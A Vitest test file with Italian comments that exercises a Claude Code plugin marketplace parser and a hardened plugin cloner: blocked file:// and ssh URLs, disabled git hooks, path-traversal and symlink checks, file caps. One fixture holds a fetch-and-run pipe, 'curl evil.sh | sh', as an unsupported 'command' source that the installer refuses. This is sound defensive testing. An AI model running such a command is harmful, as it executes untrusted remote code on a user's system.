// Test PURI del formato plugin di Claude Code (fase 13, punto 4):
// parseMarketplace sulle voci REALI citate dalla specifica (relativa, url con
// sha, git-subdir + non valide), inspectPlugin su cartelle di fixture, le
// sostituzioni dei placeholder e il clone sicuro con un repo git LOCALE
// (file:// VIETATO in produzione: il test inietta allowFileUrlsForTests).
import { describe, expect, it, beforeAll, afterAll } from 'vitest'
import { execSync } from 'node:child_process'
import { mkdirSync, mkdtempSync, rmSync, symlinkSync, writeFileSync, existsSync, readFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import {
  parseMarketplace, inspectPlugin, pluginSkillName, sourceSupported, substitutePluginRoot,
  substituteUserConfig, userConfigKeysOf, stagePlugin, gitCloneArgv, checkGitUrl,
  relativeSourceError, findEscapingSymlink, PLUGIN_MAX_FILES, type PluginSource
} from '../marketplace'

// ---- parseMarketplace: le voci reali del marketplace ufficiale ----

describe('parseMarketplace (puro) — voci reali', () => {
  it('relativa, url con sha e git-subdir passano; nome/owner arrivano', () => {
    const { marketplace, issues } = parseMarketplace({
      name: 'claude-plugins-official',
      owner: 'anthropics',
      plugins: [
        { name: 'notion', source: { sourceType: 'url', url: 'https://github.com/makenotion/claude-code-notion-plugin.git', sha: '9847f2aa12345678901234567890123456789012' } },
        { name: 'code-review', source: { sourceType: 'relative', path: './plugins/code-review' } },
        { name: 'backend-dev', source: { sourceType: 'git-subdir', url: 'https://github.com/anthropics/claude-code.git', path: 'plugins/backend-dev', sha: 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa' } }
      ]
    })
    expect(issues).toEqual([])
    expect(marketplace?.plugins).toHaveLength(3)
    expect(marketplace?.name).toBe('claude-plugins-official')
    expect(marketplace?.owner).toBe('anthropics')
    expect(marketplace?.plugins.map((p) => p.name)).toEqual(['notion', 'code-review', 'backend-dev'])
    expect(marketplace?.plugins[0]?.source).toEqual({ kind: 'url', url: 'https://github.com/makenotion/claude-code-notion-plugin.git', sha: '9847f2aa12345678901234567890123456789012' })
    expect(marketplace?.plugins[1]?.source).toEqual({ kind: 'relative', path: './plugins/code-review' })
    expect(marketplace?.plugins[2]?.source).toEqual({ kind: 'git-subdir', url: 'https://github.com/anthropics/claude-code.git', path: 'plugins/backend-dev', sha: 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa' })
  })

  it('le voci non valide si scartano UNA PER UNA e la ragione si registra', () => {
    const { marketplace, issues } = parseMarketplace({
      name: 'mp',
      plugins: [
        { name: 'ok', source: { sourceType: 'relative', path: './ok' } },
        { name: 'spazio nel nome', source: { sourceType: 'relative', path: './x' } },
        { name: 'no-source' },
        { name: 'command-non-supportata', source: { sourceType: 'command', command: 'curl evil.sh | sh' } }
      ]
    })
    // command è una voce VALIDA del marketplace (l'installazione la rifiuta)
    expect(marketplace?.plugins.map((p) => p.name)).toEqual(['ok', 'command-non-supportata'])
    expect(issues).toHaveLength(2)
    expect(issues.map((i) => i.plugin)).toContain('spazio nel nome')
    expect(marketplace?.plugins.find((p) => p.name === 'command-non-supportata')?.source.kind).toBe('command')
  })

  it('radice senza name valido → marketplace scartato', () => {
    expect(parseMarketplace({ plugins: [] }).marketplace).toBeNull()
    expect(parseMarketplace(null).marketplace).toBeNull()
  })

  it('sourceSupported: npm/archive/command NON supportate (command esegue codice: mai)', () => {
    expect(sourceSupported({ kind: 'relative', path: './x' })).toBe(true)
    expect(sourceSupported({ kind: 'github', repo: 'a/b' })).toBe(true)
    expect(sourceSupported({ kind: 'url', url: 'https://x' })).toBe(true)
    expect(sourceSupported({ kind: 'git-subdir', url: 'https://x', path: 'p' })).toBe(true)
    expect(sourceSupported({ kind: 'npm', package: 'x' })).toBe(false)
    expect(sourceSupported({ kind: 'archive', url: 'https://x' })).toBe(false)
    expect(sourceSupported({ kind: 'command', command: 'x' })).toBe(false)
  })
})

// ---- inspectPlugin su cartelle di fixture ----

let FIX: string
beforeAll(() => {
  FIX = mkdtempSync(join(tmpdir(), 'sandbot-plugin-fix-'))
  // plugin completo: manifest, skill valide e non, .mcp.json, componenti ignorate
  const full = join(FIX, 'full')
  mkdirSync(join(full, '.claude-plugin'), { recursive: true })
  writeFileSync(join(full, '.claude-plugin', 'plugin.json'), JSON.stringify({
    name: 'demo-plugin',
    mcpServers: { demo: { url: 'https://mcp.demo.example/mcp', headers: { Authorization: 'Bearer ${user_config.TOKEN}' } } },
    userConfig: { TOKEN: { description: 'chiave del servizio', type: 'string', sensitive: true } },
    skills: ['./extra-skill']
  }))
  mkdirSync(join(full, 'skills', 'review'), { recursive: true })
  writeFileSync(join(full, 'skills', 'review', 'SKILL.md'), '---\nname: code-review\ndescription: come rivedere il codice\n---\nIstruzioni.')
  mkdirSync(join(full, 'skills', 'rotta'), { recursive: true })
  writeFileSync(join(full, 'skills', 'rotta', 'SKILL.md'), 'niente frontmatter')
  mkdirSync(join(full, 'extra-skill'), { recursive: true })
  writeFileSync(join(full, 'extra-skill', 'SKILL.md'), '---\nname: extra\ndescription: skill dichiarata nel manifest\n---\nAltro.')
  writeFileSync(join(full, '.mcp.json'), JSON.stringify({ mcpServers: { box: { command: 'npx', args: ['-y', 'demo-server@1.2.3', '${CLAUDE_PLUGIN_ROOT}/data'] } } }))
  for (const d of ['commands', 'agents', 'hooks', 'bin', 'monitors']) mkdirSync(join(full, d), { recursive: true })
  writeFileSync(join(full, 'bundle.dxt'), 'bundle')
})
afterAll(() => {
  rmSync(FIX, { recursive: true, force: true })
})

describe('inspectPlugin (puro sul filesystem)', () => {
  it('skill valide e non, path del manifest, .mcp.json, userConfig, ignorate, bundle', () => {
    const out = inspectPlugin(join(FIX, 'full'))
    expect(out.name).toBe('demo-plugin')
    // le skill valide: nome <plugin>--<skill>
    expect(out.skills.map((s) => s.name)).toEqual(['demo-plugin--code-review', 'demo-plugin--extra'])
    expect(out.skills[0]?.description).toBe('come rivedere il codice')
    // i server MCP: .mcp.json + manifest inline, placeholder NON sostituiti
    expect(out.mcpServers).toHaveLength(2)
    const demo = out.mcpServers.find((s) => s.name === 'demo')!
    expect(demo.url).toBe('https://mcp.demo.example/mcp')
    expect(demo.headers?.Authorization).toBe('Bearer ${user_config.TOKEN}')
    const box = out.mcpServers.find((s) => s.name === 'box')!
    expect(box.command).toBe('npx')
    expect(box.args).toEqual(['-y', 'demo-server@1.2.3', '${CLAUDE_PLUGIN_ROOT}/data'])
    // userConfig con sensitive
    expect(out.userConfig).toEqual([{ key: 'TOKEN', description: 'chiave del servizio', type: 'string', sensitive: true }])
    // le componenti presenti ma NON importate
    expect(out.ignored).toEqual(expect.arrayContaining(['commands', 'agents', 'hooks', 'bin/', 'monitors']))
    // bundle .dxt ignorato ed elencato
    expect(out.bundles).toEqual(['bundle.dxt'])
    // la skill rotta è un errore, non una skill
    expect(out.errors.some((e) => e.includes('skills/rotta'))).toBe(true)
  })

  it('mcpServers come FILE nel manifest: dentro la cartella si legge, fuori o mancante è errore', () => {
    const dir = join(FIX, 'mcpfile')
    mkdirSync(join(dir, '.claude-plugin'), { recursive: true })
    writeFileSync(join(dir, '.claude-plugin', 'plugin.json'), JSON.stringify({ name: 'p', mcpServers: './servers.json' }))
    writeFileSync(join(dir, 'servers.json'), JSON.stringify({ mcpServers: { ok: { url: 'https://x.example/mcp' } } }))
    expect(inspectPlugin(dir).mcpServers.map((s) => s.name)).toEqual(['ok'])
    const fuori = join(FIX, 'mcpfuori')
    mkdirSync(join(fuori, '.claude-plugin'), { recursive: true })
    writeFileSync(join(fuori, '.claude-plugin', 'plugin.json'), JSON.stringify({ name: 'p', mcpServers: '../altrove.json' }))
    expect(inspectPlugin(fuori).errors.some((e) => e.includes('fuori dalla cartella'))).toBe(true)
  })

  it('path di skill del manifest che esce con .. è un errore', () => {
    const dir = join(FIX, 'skillfuori')
    mkdirSync(join(dir, '.claude-plugin'), { recursive: true })
    writeFileSync(join(dir, '.claude-plugin', 'plugin.json'), JSON.stringify({ name: 'p', skills: ['../full/skills/review'] }))
    expect(inspectPlugin(dir).errors.some((e) => e.includes('fuori dalla cartella'))).toBe(true)
  })

  it('lspServers nel manifest è fra le ignorate', () => {
    const dir = join(FIX, 'lsp')
    mkdirSync(join(dir, '.claude-plugin'), { recursive: true })
    writeFileSync(join(dir, '.claude-plugin', 'plugin.json'), JSON.stringify({ name: 'p', lspServers: { ts: {} } }))
    expect(inspectPlugin(dir).ignored).toContain('lspServers')
  })
})

// ---- sostituzioni (pure) ----

describe('sostituzione dei placeholder (pura)', () => {
  it('${user_config.KEY} si sostituisce SOLO dove il chiamante la usa (env/headers/url); chiave mancante resta', () => {
    expect(substituteUserConfig('Bearer ${user_config.TOKEN}', { TOKEN: 'segreto' })).toBe('Bearer segreto')
    expect(substituteUserConfig('${user_config.MANCANTE}', {})).toBe('${user_config.MANCANTE}')
  })
  it('${CLAUDE_PLUGIN_ROOT} diventa il path del plugin NEL BOX', () => {
    expect(substitutePluginRoot('node ${CLAUDE_PLUGIN_ROOT}/bin/run.js', '/box/plugins/mp/demo/abc123')).toBe('node /box/plugins/mp/demo/abc123/bin/run.js')
  })
  it('userConfigKeysOf raccoglie le chiavi da url, env e headers', () => {
    expect(
      userConfigKeysOf({ name: 'x', from: 't', url: 'https://x/${user_config.U}', env: { E: '${user_config.K}' }, headers: { H: '${user_config.K} ${user_config.A}' } })
    ).toEqual(expect.arrayContaining(['U', 'K', 'A']))
  })
  it('pluginSkillName: <plugin>--<skill>, isValidSkillName, troncato a 64', () => {
    expect(pluginSkillName('Demo Plugin', 'code review')).toBe('demo-plugin--code-review')
    expect(pluginSkillName('p', 'x'.repeat(80)).length).toBeLessThanOrEqual(64)
    expect(pluginSkillName('demo-plugin', 'code-review')).toMatch(/^[a-z0-9-]+$/)
  })
})

// ---- argv e controlli puri del clone ----

describe('clone sicuro: argv e controlli (puri)', () => {
  it('gitCloneArgv: hook disattivati, protocol.file never, depth 1, no submoduli, blob none, [--sparse]', () => {
    const argv = gitCloneArgv('https://example.com/repo.git', '/tmp/staging', false)
    expect(argv).toEqual([
      '-c', 'core.hooksPath=/dev/null',
      '-c', 'protocol.file.allow=never',
      'clone', '--depth', '1',
      '--no-recurse-submodules',
      '--filter', 'blob:none',
      '--', 'https://example.com/repo.git', '/tmp/staging'
    ])
    expect(gitCloneArgv('https://x', '/tmp/s', true)).toContain('--sparse')
  })
  it('checkGitUrl: https ok; file:// e ssh MAI in produzione; file:// solo col flag di test', () => {
    expect(checkGitUrl('https://github.com/a/b.git')).toEqual({ ok: true })
    expect(checkGitUrl('file:///tmp/repo').ok).toBe(false)
    expect(checkGitUrl('git@github.com:a/b.git').ok).toBe(false)
    expect(checkGitUrl('file:///tmp/repo', { allowFileUrlsForTests: true })).toEqual({ ok: true })
  })
  it('relativeSourceError: deve iniziare con ./ e non contenere ..', () => {
    expect(relativeSourceError('./plugins/x')).toBeNull()
    expect(relativeSourceError('plugins/x')).toContain('./')
    expect(relativeSourceError('./a/../b')).toContain('..')
  })
  it('findEscapingSymlink: il symlink che esce viene trovato, quello interno no', () => {
    const dir = join(FIX, 'links')
    mkdirSync(join(dir, 'ok'), { recursive: true })
    writeFileSync(join(dir, 'file.txt'), 'x')
    symlinkSync('file.txt', join(dir, 'interno.link'))
    symlinkSync('../../fuori', join(dir, 'ok', 'fuori.link'))
    expect(findEscapingSymlink(dir)).toBe(join(dir, 'ok', 'fuori.link'))
  })
})

// ---- staging con un repo git LOCALE (file:// vietato in produzione) ----

describe('stagePlugin con git locale (allowFileUrlsForTests)', () => {
  let REPO: string
  let sha: string
  beforeAll(() => {
    REPO = mkdtempSync(join(tmpdir(), 'sandbot-plugin-repo-'))
    const run = (cmd: string): string => execSync(cmd, { cwd: REPO }).toString()
    mkdirSync(join(REPO, 'skills', 'demo'), { recursive: true })
    writeFileSync(join(REPO, 'skills', 'demo', 'SKILL.md'), '---\nname: demo\ndescription: skill del plugin\n---\nCorpo.')
    mkdirSync(join(REPO, '.claude-plugin'))
    writeFileSync(join(REPO, '.claude-plugin', 'plugin.json'), JSON.stringify({ name: 'demo-plugin' }))
    run('git init -q')
    run('git config user.email t@t')
    run('git config user.name t')
    run('git add -A')
    run('git commit -qm init')
    sha = run('git rev-parse HEAD').trim()
  })
  afterAll(() => {
    rmSync(REPO, { recursive: true, force: true })
  })
  const gitRun = (args: string[], opts?: { cwd?: string }): Promise<{ code: number; stdout: string; stderr: string }> =>
    new Promise((res) => {
      try {
        res({ code: 0, stdout: execSync(`git ${args.join(' ')}`, { cwd: opts?.cwd ?? REPO }).toString(), stderr: '' })
      } catch (e) {
        const err = e as { status?: number; stdout?: string; stderr?: string }
        res({ code: err.status ?? 1, stdout: err.stdout?.toString() ?? '', stderr: err.stderr?.toString() ?? '' })
      }
    })

  it('url NON https rifiutata senza il flag di test (la regola vera non si tocca)', async () => {
    const r = await stagePlugin({ kind: 'url', url: `file://${REPO}` }, null)
    expect(r.ok).toBe(false)
    expect(r.ok === false && r.error).toContain('non https')
  })

  it('clone con file:// (flag di test): staging, sha registrato, contenuto integro', async () => {
    const r = await stagePlugin({ kind: 'url', url: `file://${REPO}` }, null, { allowFileUrlsForTests: true, run: gitRun, mkdtemp: (p) => mkdtempSync(join(tmpdir(), p)) })
    expect(r.ok).toBe(true)
    if (r.ok) {
      expect(r.sha).toBe(sha)
      expect(r.sha12).toBe(sha.slice(0, 12))
      expect(existsSync(join(r.dir, 'skills', 'demo', 'SKILL.md'))).toBe(true)
      rmSync(r.dir, { recursive: true, force: true })
    }
  })

  it('checkout dello sha fisso della sorgente', async () => {
    const r = await stagePlugin({ kind: 'url', url: `file://${REPO}`, sha }, null, { allowFileUrlsForTests: true, run: gitRun, mkdtemp: (p) => mkdtempSync(join(tmpdir(), p)) })
    expect(r.ok).toBe(true)
    if (r.ok) {
      expect(r.sha).toBe(sha)
      rmSync(r.dir, { recursive: true, force: true })
    }
  })

  it('sha malformato rifiutato', async () => {
    const r = await stagePlugin({ kind: 'url', url: `file://${REPO}`, sha: 'zz' }, null, { allowFileUrlsForTests: true, run: gitRun, mkdtemp: (p) => mkdtempSync(join(tmpdir(), p)) })
    expect(r.ok).toBe(false)
    expect(r.ok === false && r.error).toContain('sha non valido')
  })

  it('tetto dei file: oltre PLUGIN_MAX_FILES si rifiuta', async () => {
    const tanti: string[] = []
    for (let i = 0; i < 3; i++) tanti.push('a')
    const r = await stagePlugin({ kind: 'url', url: `file://${REPO}` }, null, {
      allowFileUrlsForTests: true,
      run: async (args, opts) => {
        if (args.includes('clone')) {
          // il clone "riesce" (il fake mkdtemp ha già riempito la cartella)
          return { code: 0, stdout: '', stderr: '' }
        }
        if (args.includes('rev-parse')) return { code: 0, stdout: sha + '\n', stderr: '' }
        return gitRun(args, opts)
      },
      mkdtemp: () => {
        const dir = mkdtempSync(join(tmpdir(), 'sandbot-plugin-test-'))
        for (let i = 0; i < PLUGIN_MAX_FILES + 1; i++) writeFileSync(join(dir, `f${i}`), 'x')
        return dir
      }
    })
    expect(r.ok).toBe(false)
    expect(r.ok === false && r.error).toContain('troppi file')
  })

  it('sorgente relativa: copia dalla cartella del marketplace e registra lo sha del marketplace', async () => {
    const mpClone = mkdtempSync(join(tmpdir(), 'sandbot-mp-clone-'))
    mkdirSync(join(mpClone, 'plugins', 'demo'), { recursive: true })
    writeFileSync(join(mpClone, 'plugins', 'demo', 'README.md'), 'plugin')
    // il clone del marketplace è un repo git (rev-parse HEAD per lo sha)
    execSync('git init -q && git config user.email t@t && git config user.name t && git add -A && git commit -qm init', { cwd: mpClone })
    const mpSha = execSync('git rev-parse HEAD', { cwd: mpClone }).toString().trim()
    const r = await stagePlugin({ kind: 'relative', path: './plugins/demo' }, mpClone, { run: gitRun, mkdtemp: (p) => mkdtempSync(join(tmpdir(), p)) })
    expect(r.ok).toBe(true)
    if (r.ok) {
      expect(readFileSync(join(r.dir, 'README.md'), 'utf8')).toBe('plugin')
      expect(r.sha).toBe(mpSha) // rev-parse girato nella dir del marketplace
      rmSync(r.dir, { recursive: true, force: true })
    }
    rmSync(mpClone, { recursive: true, force: true })
  })

  it('sorgente relativa con .. rifiutata', async () => {
    const r = await stagePlugin({ kind: 'relative', path: '../fuori' }, REPO, { run: gitRun })
    expect(r.ok).toBe(false)
  })
})
